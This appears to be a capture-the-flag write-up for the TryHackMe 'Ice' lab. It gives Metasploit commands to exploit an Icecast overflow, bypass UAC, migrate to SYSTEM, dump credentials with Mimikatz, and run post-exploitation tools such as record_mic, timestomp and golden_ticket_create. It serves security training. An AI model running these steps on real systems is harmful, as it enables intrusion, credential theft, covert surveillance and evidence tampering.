# [Ice](https://tryhackme.com/room/ice)

> Deploy & hack into a Windows machine, exploiting a very poorly secured media server.

## Scanning

scan the machine

```
nmap -sS -sV -sC -T4 10.10.97.40
```

wow, a vulnerable machine with a lot of open port

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/91723cd7-6f79-4f17-b24a-d943fa2c557c)

and nmap also aprear a smb result

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/d2563845-f24e-4633-9750-bbac0a5667bc)

## Exploitation

search for the vulnerabilites of it's service

```
msfconsole
search icecast
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/a956a915-c8cb-4a31-b4f9-470ac7ad2959)

we found a `execute code overflow` of CVE-2004-1561

```
use 0
info
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/b08b4c51-2046-4f85-b38e-bd890942624e)

```
show options
set RHOSTS 10.10.97.40
set LHOST 10.18.37.45
exploit
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/c864d081-f2e3-4432-b2e5-898fc05e0ae9)

we gain an access, let's look around

```
getuid
sysinfo
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/6ce100aa-2e8c-459c-a230-2b7a0293b8f7)

## Privilege Escalation

metasploit provides a module that will automatically scan for potential escalation exploits based on the system that we are in

```
run post/multi/recon/local_exploit_suggester
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/bd4d1466-cc6b-4cf0-a930-dcce50662236)

we found an exploit, background the session before use

```
Ctrl + Z
use exploit/windows/local/bypassuac_eventvwr
show options
set session 1
set LHOST 10.18.37.45
exploit
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/6f371ac2-61c8-45e7-9e8e-f68e645ecc42)

check our permission

```
getprivs
```

we already got a lot of roles, include take ownership of files

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/fffa56ef-1a82-434e-927e-62da05ae6844)

even though we have a lot of privileges in the system, but our current process does not

```
ps
```

so now we want to migrate to another, `spoolsv.exe` is owned by 'NT AUTHORITY\SYSTEM' one of example

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/cad0584f-e0ba-4681-8d1d-4ab753e2ffb8)

```
migrate -N 1376
getuid
```

now, we are in 'NT AUTHORITY\SYSTEM' that are full administrator permissions

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/6d52f6ea-0e56-4a94-aa64-38540cad9db8)

using Mimikatz to retrieve all the credentials

```
load kiwi
creds_all
```

there you go!

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/c85c398b-8dfc-4036-8f6c-15fd6bea7bb6)

## Post-Exploitation

this section wants to hone your skills about the meterpreter and Mimikatz

have a look at the documentation by typing:

```
help
```


What command allows us to dump all of the password hashes stored on the system? We won't crack the Administrative password in this case as it's pretty strong (this is intentional to avoid password spraying attempts)

```
hashdump
```

While more useful when interacting with a machine being used, what command allows us to watch the remote user's desktop in real time?

```
screenshare
```

How about if we wanted to record from a microphone attached to the system?

```
record_mic
```

To complicate forensics efforts we can modify timestamps of files on the system. What command allows us to do this? Don't ever do this on a pentest unless you're explicitly allowed to do so! This is not beneficial to the defending team as they try to breakdown the events of the pentest after the fact.

```
timestomp
```

Mimikatz allows us to create what's called a `golden ticket`, allowing us to authenticate anywhere with ease. What command allows us to do this?

```
golden_ticket_create
```

As we have the password for the user 'Dark' we can now authenticate to the machine and access it via remote desktop (MSRDP). As this is a workstation, we'd likely kick whatever user is signed onto it off if we connect to it, however, it's always interesting to remote into machines and view them as their users do. 

If this hasn't already been enabled, we can enable it via the following Metasploit module: `run post/windows/manage/enable_rdp`
